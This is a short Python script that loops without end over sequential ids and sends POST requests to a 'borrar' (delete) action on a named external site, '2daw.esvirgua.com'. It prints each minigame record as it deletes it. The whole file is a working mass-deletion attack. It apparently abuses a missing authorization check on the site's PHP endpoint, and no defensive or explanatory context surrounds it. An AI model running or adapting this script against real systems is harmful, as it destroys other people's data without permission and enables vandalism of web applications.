import requests, os, random, string, json


id = 0
while True:
    id+=1
    strId = str(id)
    ip = '2daw.esvirgua.com'
    url = 'https://'+ip+'/18/3_Minijuegos_Icono/app/php/index.php?accion=borrar&id='+ strId

    requests.post(url, allow_redirects=False, data={
        'borrar': 'Borrar'
    })
    print ('Borrando minijuego con id: %i' % (id))

